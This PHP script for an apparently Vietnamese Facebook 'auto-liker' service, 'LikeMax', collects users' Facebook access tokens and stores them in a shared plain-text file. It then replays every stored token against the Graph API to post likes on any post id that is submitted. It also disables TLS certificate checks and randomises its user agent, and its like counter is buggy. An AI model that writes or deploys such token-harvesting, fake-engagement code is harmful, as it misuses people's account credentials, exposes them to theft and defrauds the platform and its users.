<?php
require('config.php');
if (isset($_POST['a'])) {
    $token = trim($_POST['a']);
    $me = json_decode(getPage('https://graph.fb.me/me?access_token=' . $token), true);
    if (empty($me['id'])) {
        echo '1';
        exit;
    } else {
        $app = json_decode(getPage('https://graph.fb.me/app?access_token=' . $token), true);
        $app['id'] != $config['app_id'] && die('1');
        $data = json_decode(file_get_contents('database/tokens.txt'), true);
        if (!in_array($token, $data)) {
            $p[] = $token;
            $data = array_merge($data, $p);
        } else {
            $data[array_search($token, $data)] = $token;
        }
        $fp = fopen('database/tokens.txt', 'w+');
        fwrite($fp, json_encode($data));
        fclose($fp);
        $me['count'] = count($data);
        $_SESSION['login'] = $token;
        $_SESSION['me'] = $me;
        echo sprintf('?i=%s', urlencode(sprintf('Welcome to LikeMax. Xin chào %s', $me['name'])));
    }
} elseif (isset($_POST['id'])) {
//    if (file_exists(sprintf('IP/%s', $_SERVER['REMOTE_ADDR']))) {
//        if (file_get_contents(sprintf('IP/%s', $_SERVER['REMOTE_ADDR'])) - time() < 900) {
//            die('cac');
//        } else {
//            @unlink(sprintf('IP/%s', $_SERVER['REMOTE_ADDR']));
//        }
//    }
    $data = json_decode(file_get_contents('database/tokens.txt'), true);
    $x = 0;
    for ($i = 0; $i < $config['limit']; $i++) {
        if (@$data[$i]) {
            $x = getPage(sprintf('https://graph.fb.me/%s/likes?method=POST&access_token=%s', $_POST['id'], $data[$i]));
            if ($x == 'true') {
                $x++;
            }
        }
    }
    $t = time() + $config['countdown'];
    $fp = fopen(sprintf('IP/%s', $_SERVER['REMOTE_ADDR']), 'w+');
    fwrite($fp, $t);
    fclose($fp);
    echo json_encode(array($x, $config['countdown']));
}
function getPage($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_REFERER, 'http://ancms.systems');
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_USERAGENT, sprintf("Mozilla/%d.0", rand(4, 5)));
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    $html = curl_exec($curl);
    curl_close($curl);
    return $html;
}